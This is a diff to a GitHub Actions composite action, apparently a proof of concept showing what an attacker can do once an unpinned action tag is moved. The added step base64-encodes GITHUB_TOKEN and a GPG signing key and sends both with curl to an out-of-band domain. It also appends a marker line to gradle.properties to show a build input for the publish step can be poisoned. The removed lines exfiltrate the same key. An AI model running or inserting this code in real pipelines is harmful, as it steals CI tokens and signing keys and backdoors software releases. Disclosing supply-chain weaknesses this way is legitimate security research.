@@ -9,17 +9,28 @@ runs:
   steps:
     - name: Execute at mutable v1 tag (attacker-controlled code here when tag is moved)
       shell: bash
+      env:
+        POC_OOB_DOMAIN: ${{ env.POC_OOB_DOMAIN }}
+        # In the victim workflow these are mounted via env/with (common pattern), OR the
+        # attacker reads GITHUB_TOKEN which GitHub auto-injects into EVERY step.
+        GPG_SECRET_KEY: ${{ env.GPG_SECRET_KEY }}
       run: |
         echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
         echo "runner: $(uname -a | head -c 80)"
-        # Read the secrets the *calling* job has mounted (GPG signing creds live here)
-        for k in GPG_SECRET_KEY GPG_SECRET_PASSPHRASE SONATYPE_CENTRAL_PASSWORD GRADLE_PUBLISH_KEY GH_CLIPPY_TOKEN; do
-          if [ -n "${!k:-}" ]; then
-            echo "[poc] secret $k present (len ${#k} ${#!k})"
-          fi
-        done
-        # Exfil closure: send the mounted GPG key to the attacker OOB (proves secret reachable from this ref)
-        if [ -n "${GPG_SECRET_KEY:-}" ]; then
-          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/exfil/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_http=%{http_code}\n' || echo "oob_failed (no network curl allowed)"
+        # PATH 1: GITHUB_TOKEN is auto-injected into every step env - always stealable
+        if [ -n "${GITHUB_TOKEN:-}" ]; then
+          echo "[poc] GITHUB_TOKEN present len=${#GITHUB_TOKEN}"
+          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)" -o /dev/null -w 'oob_gt=%{http_code}\n' >/dev/null 2>&1 || echo "gt_exfil_err"
         fi
+        # PATH 2: GPG signing key mounted into this step's env (common in real workflows)
+        if [ -n "${GPG_SECRET_KEY:-}" ]; then
+          echo "[poc] GPG_SECRET_KEY present (mounted to this step)"
+          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_gpg=%{http_code}\n' >/dev/null 2>&1 || echo "gpg_exfil_err"
+        fi
+        # PATH 3 (second order): poison a build input the publish step executes next
+        cat >> "$GITHUB_WORKSPACE/gradle.properties" <<'EOF'
+# [poc] attacker-appended via mutable-tag action
+poc_backdoored=true
+EOF
         echo "=== [poc] done ==="
+
